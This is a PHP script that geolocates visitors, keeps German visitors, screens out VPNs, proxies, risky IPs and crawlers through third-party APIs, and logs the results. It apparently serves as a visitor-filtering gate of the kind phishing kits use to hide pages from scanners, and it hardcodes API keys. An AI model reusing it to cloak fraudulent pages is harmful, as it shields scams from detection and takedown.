<?php

require_once 'logs.php';

session_start();
# GET IP INFORMATION ------------------------------------------------------
$flag_country = false;
$flag_isrisky = true;
$curl = curl_init();
$ip = $_SERVER['REMOTE_ADDR'];
$access_key = '8f5dc0a0cb0ca93be1db21ae527b1962';
$logfile = "./logs/index.log";
$massege = "";

// Initialize CURL:
$ch = curl_init('http://api.ipstack.com/'.$ip.'?access_key='.$access_key.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Store the data:
$json = curl_exec($ch);
curl_close($ch);
//GET COUNTERY
// Decode JSON response:
$api_result = json_decode($json, true);
$_SESSION['geoip'] = $api_result;
$ip = $api_result['ip'];
$country = $api_result['country_name'];
if( $country == 'Germany'){
    $flag_country = true;
}
# ----------------------------------------------------------------------------
# GET IS VPN -----------------------------------------------------------------
// Initialize CURL:
$ch = curl_init('https://ip.teoh.io/api/vpn/'.$ip.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Store the data:
$json = curl_exec($ch);
curl_close($ch);

// Decode JSON response:
$api_result = json_decode($json, true);
$_SESSION['risk'] = $api_result;


if(!($api_result['vpn_or_proxy'] == 'yes' || $api_result['risk'] != 'low')){
    $flag_isrisky = false;
}
# ------------------------------------------------------------------------------
# GET IS CRAWLER ---------------------------------------------------------------
$api_request = "http://api.userstack.com/detect?access_key=39880b7bb82f771579268590c4931118&ua=".urlencode($_SERVER['HTTP_USER_AGENT']);
$ua = json_decode(file_get_contents($api_request));
$is_crawler = $ua -> crawler -> is_crawler;
$data = var_export ( $ua, TRUE );


# Test Whois API
// Initialize CURL:
$ch = curl_init('https://4quewkl50h.execute-api.eu-west-1.amazonaws.com/API/api-whois?ip=208.126.114.29');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Store the data:
$json = curl_exec($ch);
curl_close($ch);

// Decode JSON response:
$result = json_decode($json, true);

$whois_data = var_export($result);

$massege = "\n--> FAILED THE TEST!\n--> countery: {$country}\n--> vpn OR proxy: {$api_result['vpn_or_proxy']}\nIP: {$ip}\nData: {$data}\nWHOIS: {$whois_data} \n";
    write_log($massege,$logfile);

?>